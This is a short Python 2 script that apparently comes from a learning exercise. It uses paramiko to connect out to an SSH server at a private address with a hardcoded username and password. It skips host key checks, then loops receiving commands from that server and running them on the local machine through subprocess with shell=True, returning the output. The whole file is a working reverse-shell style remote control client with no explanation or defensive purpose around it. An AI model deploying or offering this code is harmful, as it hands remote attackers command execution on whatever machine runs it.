####################################################################
#
# SSH client, who receives commands from SSH server
# and execute it on SSH client(itself)
#
####################################################################


import threading
import paramiko
import subprocess


def ssh_command(hostname, port, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/wengyan/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        # read banner
        print ssh_session.recv(1024)

        while True:
            # get command from ssh server
            command = ssh_session.recv(1024)
            if command == 'exit':
                client.close()
                break
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))

    return

ssh_command('192.168.1.102', '10022', 'wengyan', '123456', 'ClientConnected')
